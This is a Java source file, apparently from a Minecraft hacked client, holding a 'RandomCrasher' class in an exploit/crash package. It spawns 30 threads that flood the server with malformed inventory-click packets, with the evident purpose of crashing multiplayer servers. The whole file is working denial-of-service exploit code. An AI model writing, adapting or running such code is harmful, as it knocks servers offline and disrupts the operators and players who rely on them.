package com.moonclient.pro.Exploit.Crash;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.client.Minecraft;

@Environment(value=EnvType.CLIENT)
public class RandomCrasher {
    private static final int THREAD_COUNT = 30;
    private static final ExecutorService executorService = Executors.newFixedThreadPool(30);

    public void execute() {
        Int2ObjectArrayMap itemMap = new Int2ObjectArrayMap();
        itemMap.put(0, new ItemStack(Items.ACACIA_BOAT, 1));
        for (int i = 0; i < 30; ++i) {
            executorService.submit(() -> {
                for (int slot = 0; slot < 26; ++slot) {
                    try {
                        ServerboundContainerClickPacket packet = new ServerboundContainerClickPacket(Minecraft.getInstance().player.containerMenu.containerId, Minecraft.getInstance().player.containerMenu.getStateId(), slot, -1, ClickType.SWAP, Minecraft.getInstance().player.containerMenu.getCarried().copy(), itemMap);
                        Minecraft.getInstance().getConnection().send(packet);
                        continue;
                    }
                    catch (Exception ignored) {}
                }
                try {
                    TimeUnit.MILLISECONDS.sleep(20L);
                }
                catch (InterruptedException ignored) {}
            });
        }
    }
}
 